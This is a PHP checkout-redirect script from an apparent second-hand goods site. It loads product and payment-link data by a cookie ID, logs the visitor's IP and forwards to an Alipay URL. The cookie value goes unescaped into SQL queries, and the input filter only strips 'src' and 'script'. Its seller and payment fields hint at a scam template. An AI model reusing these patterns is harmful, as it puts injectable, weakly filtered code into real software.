
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');

$xzshijian=date('Y-m-d H:i:s', time());
$wwid=$_REQUEST['a'];
$ip=getIP();

$tel889=$_REQUEST['tel'];
$tel889=str_ireplace("src","",$tel889);
$tel889=str_ireplace("script","",$tel889);

if($_COOKIE['GoodsID4']){
  

	$_GoodsID = _fetch_array("SELECT
									goods_class.gclass_id,
									goods_class.gc_name,
									goods_class.gc_type,
									goods_class.web_name,
									goods_class.jump_url,
									goods_class.web_logo,
									goods_class.web_name2,
									goods.goods_id,
									goods.title,
									goods.price,
									goods.freight,
									goods.region,
									goods.goods_desc,
									goods.test_desc,
									goods.hits,
									goods.stock,
									goods.doods_num,
									goods.tran_num,
									goods.recovery_rate,
									goods.user_portrait,
									goods.user_name,
									goods.user_gender,
									goods.user_grade,
									goods.att_capacity,
									goods.att_color,
									goods.att_channel,
									goods.weixin_img,
									goods.zhifubao_img,
									goods.goods_img1,
									goods.goods_img2,
									goods.goods_img3,
									goods.goods_img4,
									goods.goods_img5,
									goods.test_desc2,
									goods.is_shelves,
									goods.oldnew,
									goods.in_admin_id,
									goods.in_class_id,
									goods.imUrl,
									goods.add_time,
									goods.zhifubaoURL,
									goods.wxURL,
									goods.pay_fangshi,
									goods.goods_oid
								FROM
									goods_class
								INNER JOIN goods ON goods_class.gclass_id = goods.in_class_id 
								WHERE goods_id='{$_COOKIE['GoodsID4']}'") or die('SQL执行错误');


}
if($_COOKIE['GoodsID4']){
	
    //存在就更新此数据状态为3地址页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID4']}'");
	
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=4,
				dianji=1,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}'AND gid='{$_COOKIE['GoodsID4']}' LIMIT 1") or die(mysql_error());
		  _close();
		  session_destroy();
	}
	
	
	
	if(!$_GoodsID){
       header('Location:'. htmlspecialchars_decode($_GoodsID['jump_url']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($_GoodsID['jump_url']).'');
}

header('location:'.htmlspecialchars_decode($_GoodsID['zhifubaoURL']));

?>

